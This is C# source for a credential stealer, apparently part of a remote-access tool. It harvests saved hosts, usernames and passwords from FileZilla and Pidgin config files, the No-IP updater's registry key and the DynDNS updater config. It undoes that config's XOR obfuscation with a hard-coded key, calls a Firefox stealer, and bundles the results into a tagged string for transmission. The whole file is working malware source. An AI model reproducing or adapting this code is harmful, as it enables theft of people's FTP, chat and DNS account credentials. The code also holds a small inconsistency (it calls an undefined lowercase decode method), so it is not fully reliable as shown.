using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Xml;
using System.Windows;
using Microsoft.Win32;

namespace server_form.passwords
{
    public class Passwords
    {
        static public string GetPasswords()
        {
            return "[[PASSWORDS]]" + GetFilezillaPasswords() + GetPidginPasswords() + GetNoIPDucPassword() + GetDynDnsPassword() + firefox_pas.FirefoxStealer.GetFirefox() + "[[/PASSWORDS]]";
        }

        public static string GetFilezillaPasswords()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            path += @"\FileZilla\recentservers.xml";

            if (!File.Exists(path)) {
                return string.Empty;
            } else {
                XmlTextReader reader = new XmlTextReader(path);
                string query = string.Empty;
                string element = string.Empty;
                while (reader.Read())
                {
                   switch (reader.NodeType) {
                       case XmlNodeType.Element:
                           element = reader.Name;
                           if (reader.Name == "Server") {
                               query += "[[PASSWORD]]FILEZILLA|*|";
                           }
                           break;
                       case XmlNodeType.Text:
                           if (element == "Host") {
                               query += reader.Value + "|*|";
                           } else if (element == "User") {
                               query += reader.Value + "|*|";
                           } else if (element == "Pass") {
                               query += reader.Value;
                           }
                           break;
                       case XmlNodeType.EndElement:
                           if (reader.Name == "Server") {
                               query += "[[/PASSWORD]]";
                           }
                           break;
                   }
                }
                return query;
            }
        }

        public static string GetPidginPasswords()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            path += @"\.purple\accounts.xml";

            if (!File.Exists(path))
            {
                return string.Empty;
            }
            else
            {
                try
                {
                    XmlTextReader reader = new XmlTextReader(path);
                    string query = string.Empty;
                    string element = string.Empty;
                    while (reader.Read())
                    {
                        switch (reader.NodeType)
                        {
                            case XmlNodeType.Element:
                                element = reader.Name;
                                if (reader.Name == "protocol")
                                {
                                    query += "[[PASSWORD]]PIDGIN|*|";
                                }
                                break;
                            case XmlNodeType.Text:
                                if (element == "name")
                                {
                                    query += reader.Value + "|*|";
                                }
                                else if (element == "password")
                                {
                                    query += reader.Value + "[[/PASSWORD]]";
                                }
                                break;                        }
                    }
                    return query;
                } catch (Exception ex) {
                    return string.Empty;
                }
            }
        }

        public static string GetNoIPDucPassword()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Vitalwerks\DUC");
            string username = key.GetValue("Username").ToString();
            string password = key.GetValue("Password").ToString();
            password = base64Decode(password);
            return "[[PASSWORD]]NOIP|*|" + username + "|*|" + password + "[[/PASSWORD]]";
        }

        public static string GetDynDnsPassword()
        {
            string path = Environment.GetEnvironmentVariable("ALLUSERSPROFILE");
            path += @"\DynDNS\Updater\config.dyndns";
            if (File.Exists(path)) {
                string[] lines = File.ReadAllLines(path);
                string username = lines[1].Substring(9);
                string password = lines[2].Substring(9);
                password = DecryptDynDns(password);
                return "[[PASSWORD]]DYNDNS|*|" + username + "|*|" + password + "[[/PASSWORD]]";
            }
            return string.Empty;
        }

        private static string DecryptDynDns(string encrypted)
        {
            var decoded = string.Empty;
            for (var i = 0; i < encrypted.Length; i += 2)
            {
                decoded += (char)int.Parse(encrypted.Substring(i, 2), System.Globalization.NumberStyles.HexNumber);
            }
            char[] chars = new char[decoded.Length];
            var lPtr = 0;
            for (var i = 0; i < chars.Length; i++)
            {
                chars[i] = (char)(decoded.ToCharArray()[i] ^ Convert.ToChar("t6KzXhCh".Substring(lPtr, 1)));
                lPtr = ((lPtr + 1) % 8);
            }
            return new string(chars);
        }

        private static string Base64Decode(string data)
        {
            try
            {
                Decoder utf8Decode = new UTF8Encoding().GetDecoder();
                byte[] todecode_byte = Convert.FromBase64String(data);
                char[] decoded_char = new char[(utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length))];
                utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0);
                return new String(decoded_char);
            }
            catch (Exception) { return null; }
        }
    }
}
